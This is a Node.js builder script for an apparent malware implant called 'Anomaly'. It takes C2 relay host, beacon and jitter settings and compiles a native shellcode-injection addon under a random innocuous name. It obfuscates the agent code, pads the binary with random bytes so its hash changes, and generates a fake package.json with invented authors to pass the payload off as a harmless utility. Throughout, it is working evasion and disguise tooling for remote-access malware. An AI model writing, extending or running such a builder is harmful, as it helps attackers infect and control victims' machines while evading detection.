const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');
const { execSync } = require('child_process');

// Helper to prompt for input
function prompt(question, defaultValue = '') {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    return new Promise((resolve) => {
        rl.question(question, (answer) => {
            rl.close();
            resolve(answer.trim() || defaultValue);
        });
    });
}

async function main() {
    console.log('==========================================');
    console.log('  Anomaly Agent Builder');
    console.log('==========================================');
    console.log('');

    // Check if dependencies are installed
    if (!fs.existsSync(path.join(__dirname, 'node_modules'))) {
        console.log('[+] Installing dependencies...');
        try {
            execSync('npm install', { stdio: 'inherit' });
            console.log('');
        } catch (err) {
            console.error('[!] npm install failed!');
            process.exit(1);
        }
    }

    // Check for javascript-obfuscator
    let JavaScriptObfuscator;
    try {
        JavaScriptObfuscator = require('javascript-obfuscator');
    } catch (err) {
        console.error('[!] javascript-obfuscator not found.');
        console.error('[!] Run: npm install');
        process.exit(1);
    }

    // Prompt for configuration
    const config = {
        host: await prompt('C2 Relay Host [localhost]: ', 'localhost'),
        port: await prompt('C2 Relay Port [8082]: ', '8082'),
        endpoint: await prompt('C2 Endpoint [/wiki]: ', '/wiki'),
        hmac: await prompt('HMAC Key (hex): '),
        interval: await prompt('Beacon Interval (seconds) [15]: ', '15'),
        jitter: await prompt('Jitter (seconds) [10]: ', '10'),
        ua: await prompt('User Agent [Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36]: ', 
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    };

    if (!config.hmac) {
        console.error('\n[ERROR] HMAC key is required!');
        process.exit(1);
    }

    console.log('');
    console.log('Configuration:');
    console.log(`  Host:            ${config.host}`);
    console.log(`  Port:            ${config.port} (HTTPS)`);
    console.log(`  Endpoint:        ${config.endpoint}`);
    console.log(`  HMAC Key:        ${config.hmac.substring(0, 16)}...${config.hmac.substring(config.hmac.length - 8)}`);
    console.log(`  Beacon Interval: ${config.interval}s`);
    console.log(`  Jitter:          ${config.jitter}s`);
    console.log('');

    // Prompt for file path and name
    console.log('Native Module Configuration:');
    const customPath = await prompt('Module file path (relative, e.g., "lib/utils" or "build/Release", "." for root, empty/"random" for random) [random]: ', '');
    const customFileName = await prompt('Module filename (without .node extension, e.g., "inject", empty for random) [random]: ', '');
    console.log('');

    // Generate random names if not provided
    let moduleName, folderPath;
    if (customFileName.trim()) {
        moduleName = customFileName.trim();
    } else {
        moduleName = generateRandomModuleName();
        console.log(`[+] Generated random module name: ${moduleName}`);
    }

    const pathInput = customPath.trim().toLowerCase();
    if (pathInput === '' || pathInput === 'random') {
        folderPath = generateRandomModuleName();
        console.log(`[+] Generated random folder path: ${folderPath}`);
    } else {
        folderPath = customPath.trim().replace(/\\/g, '/'); // Normalize path separators
        // Remove leading/trailing slashes, but preserve "." for root
        if (folderPath === '.' || folderPath === './' || folderPath === '/.') {
            folderPath = ''; // Empty string means root directory
            console.log(`[+] Using root directory`);
        } else {
            folderPath = folderPath.replace(/^\/+|\/+$/g, '');
            console.log(`[+] Using custom path: ${folderPath}`);
        }
    }
    console.log('');

    // Build native addon with module name
    console.log('[+] Building native shellcode injection addon...');
    try {
        // Update binding.gyp and inject.cc with module name
        updateModuleName(moduleName);
        
        execSync('npm run build:addon', { stdio: 'inherit' });
        console.log('');
        
        // Restore original files
        restoreModuleName();
    } catch (err) {
        // Restore original files even on error
        restoreModuleName();
        console.error('\n[!] Native addon build failed!');
        console.error('[!] Make sure you have Visual Studio Build Tools installed.');
        console.error('[!] Download from: https://visualstudio.microsoft.com/downloads/');
        process.exit(1);
    }

    buildPayload(config, JavaScriptObfuscator, moduleName, folderPath);
}

function generateRandomModuleName() {
    const prefixes = ['util', 'helper', 'core', 'lib', 'mod', 'ext', 'sys', 'app'];
    const suffixes = ['loader', 'manager', 'handler', 'service', 'module', 'addon', 'plugin', 'tool'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    const randomNum = Math.floor(Math.random() * 1000);
    
    // Randomly order the components: prefix, number, suffix
    const components = [
        { type: 'prefix', value: prefix },
        { type: 'number', value: randomNum.toString() },
        { type: 'suffix', value: suffix }
    ];
    
    // Shuffle the array randomly
    for (let i = components.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [components[i], components[j]] = [components[j], components[i]];
    }
    
    // Join the shuffled components
    return components.map(c => c.value).join('');
}

function updateModuleName(moduleName) {
    const bindingGypPath = path.join(__dirname, 'binding.gyp');
    const injectCcPath = path.join(__dirname, 'inject.cc');
    
    // Backup original files
    if (!fs.existsSync(bindingGypPath + '.bak')) {
        fs.copyFileSync(bindingGypPath, bindingGypPath + '.bak');
    }
    if (!fs.existsSync(injectCcPath + '.bak')) {
        fs.copyFileSync(injectCcPath, injectCcPath + '.bak');
    }
    
    // Update binding.gyp
    let bindingGyp = fs.readFileSync(bindingGypPath, 'utf-8');
    bindingGyp = bindingGyp.replace(/"target_name":\s*"inject"/, `"target_name": "${moduleName}"`);
    fs.writeFileSync(bindingGypPath, bindingGyp);
    
    // Update inject.cc
    let injectCc = fs.readFileSync(injectCcPath, 'utf-8');
    injectCc = injectCc.replace(/NODE_API_MODULE\(inject,\s*Init\)/g, `NODE_API_MODULE(${moduleName}, Init)`);
    fs.writeFileSync(injectCcPath, injectCc);
}

function restoreModuleName() {
    const bindingGypPath = path.join(__dirname, 'binding.gyp');
    const injectCcPath = path.join(__dirname, 'inject.cc');
    
    // Restore from backup if exists
    if (fs.existsSync(bindingGypPath + '.bak')) {
        fs.copyFileSync(bindingGypPath + '.bak', bindingGypPath);
        fs.unlinkSync(bindingGypPath + '.bak');
    }
    if (fs.existsSync(injectCcPath + '.bak')) {
        fs.copyFileSync(injectCcPath + '.bak', injectCcPath);
        fs.unlinkSync(injectCcPath + '.bak');
    }
}

function buildPayload(config, JavaScriptObfuscator, moduleName, folderPath) {

// Directories
const sourceDir = __dirname;
const outputDir = path.join(__dirname, 'app');
const buildDir = path.join(__dirname, 'build', 'Release');

// Random metadata, consider feeding this into poly engine :)
const names = ['dev-helper', 'code-tool', 'app-manager', 'system-util', 'data-sync'];
const firstNames = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey'];
const lastNames = ['Smith', 'Lee', 'Brown', 'Davis', 'Wilson'];
const descriptions = [
    'A utility for system management',
    'Development helper tool',
    'Application management system',
    'Data synchronization utility'
];
const licenses = ['MIT', 'Apache-2.0', 'ISC', 'BSD-3-Clause'];

function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomAuthor() {
    return `${randomChoice(firstNames)} ${randomChoice(lastNames)}`;
}

function randomVersion() {
    return `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`;
}

function hashFile(filePath) {
    const fileBuffer = fs.readFileSync(filePath);
    return crypto.createHash('sha256').update(fileBuffer).digest('hex');
}

console.log('[+] Building Anomaly payload...\n');

// Reset output directory
if (fs.existsSync(outputDir)) {
    fs.rmSync(outputDir, { recursive: true, force: true });
}
fs.mkdirSync(outputDir, { recursive: true });

// Inject configuration into main.js
console.log('[+] Injecting configuration...');
let mainCode = fs.readFileSync(path.join(sourceDir, 'main.js'), 'utf-8');

// Replace configuration values
mainCode = mainCode.replace(
    /const LISTENER_HOST = process\.env\.ANOMALY_HOST \|\| '[^']*';/,
    `const LISTENER_HOST = process.env.ANOMALY_HOST || '${config.host}';`
);
mainCode = mainCode.replace(
    /const LISTENER_PORT = process\.env\.ANOMALY_PORT \|\| '[^']*';/,
    `const LISTENER_PORT = process.env.ANOMALY_PORT || '${config.port}';`
);
mainCode = mainCode.replace(
    /const LISTENER_ENDPOINT = process\.env\.ANOMALY_ENDPOINT \|\| '[^']*';/,
    `const LISTENER_ENDPOINT = process.env.ANOMALY_ENDPOINT || '${config.endpoint}';`
);
mainCode = mainCode.replace(
    /const HMAC_KEY = process\.env\.ANOMALY_HMAC_KEY \|\| '[^']*';/,
    `const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '${config.hmac}';`
);
mainCode = mainCode.replace(
    /const RECONNECT_INTERVAL = parseInt\(process\.env\.ANOMALY_INTERVAL \|\| '[^']*', 10\);/,
    `const RECONNECT_INTERVAL = parseInt(process.env.ANOMALY_INTERVAL || '${config.interval}', 10);`
);
mainCode = mainCode.replace(
    /const JITTER_SECONDS = parseInt\(process\.env\.ANOMALY_JITTER \|\| '[^']*', 10\);/,
    `const JITTER_SECONDS = parseInt(process.env.ANOMALY_JITTER || '${config.jitter}', 10);`
);
if (config.ua) {
    mainCode = mainCode.replace(
        /const USER_AGENT = process\.env\.ANOMALY_USER_AGENT \|\| '[^']*';/,
        `const USER_AGENT = process.env.ANOMALY_USER_AGENT || '${config.ua}';`
    );
}

// Replace inject module name and path with provided or random names
// If folderPath is empty, place in root; otherwise use the folder path
const requirePath = folderPath ? `./${folderPath}/${moduleName}.node` : `./${moduleName}.node`;
mainCode = mainCode.replace(
    /require\(['"]\.\/build\/Release\/inject\.node['"]\)/g,
    `require('${requirePath}')`
);

// Obfuscate main.js
console.log('[+] Obfuscating main.js...');
const obfuscatedMain = JavaScriptObfuscator.obfuscate(mainCode, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.5,
    stringArrayEncoding: ['rc4'],
    stringArrayThreshold: 0.75,
    splitStrings: true,
    splitStringsChunkLength: 5
}).getObfuscatedCode();
fs.writeFileSync(path.join(outputDir, 'main.js'), obfuscatedMain);

// Modify module.node PE binary to change hash
const moduleSrc = path.join(buildDir, `${moduleName}.node`);
const moduleDst = path.join(outputDir, `${moduleName}.node`);

if (fs.existsSync(moduleSrc)) {
    console.log(`[+] Modifying ${moduleName}.node hash...`);
    
    const moduleBuffer = fs.readFileSync(moduleSrc);
    
    // Append random junk bytes to change hash
    const junkBytes = crypto.randomBytes(256);
    const modifiedBuffer = Buffer.concat([moduleBuffer, junkBytes]);
    
    fs.writeFileSync(moduleDst, modifiedBuffer);
    
    console.log(`    Original hash: ${hashFile(moduleSrc).substring(0, 16)}...`);
    console.log(`    Modified hash: ${hashFile(moduleDst).substring(0, 16)}...`);
} else {
    console.error(`[!] ${moduleName}.node not found. Make sure to build the native addon first.`);
    process.exit(1);
}

// Create folder directory structure (supports subdirectories)
// If folderPath is empty, place in root; otherwise create the folder structure
const finalPath = folderPath ? path.join(outputDir, folderPath) : outputDir;
fs.mkdirSync(finalPath, { recursive: true });
fs.copyFileSync(moduleDst, path.join(finalPath, `${moduleName}.node`));
fs.unlinkSync(moduleDst);

// Generate randomized package.json
console.log('[+] Generating randomized package.json...');
const pkgData = {
    name: randomChoice(names),
    version: randomVersion(),
    description: randomChoice(descriptions),
    main: 'main.js',
    author: randomAuthor(),
    license: randomChoice(licenses),
    keywords: ['utility', 'tool', 'helper'],
    engines: {
        node: '>=14.0.0'
    }
};
fs.writeFileSync(path.join(outputDir, 'package.json'), JSON.stringify(pkgData, null, 2));

console.log('\n[+] Payload build complete!');
console.log('    Output directory: ./app');
    console.log(`    Package: ${pkgData.name} v${pkgData.version}`);
    console.log('');
    console.log('==========================================');
    console.log('  Build Complete!');
    console.log('==========================================');
    console.log('  Output: ./app directory');
    console.log('  Run: node app/main.js');
    console.log('==========================================');
}

main().catch(err => {
    console.error('[!] Build failed:', err.message);
    process.exit(1);
});

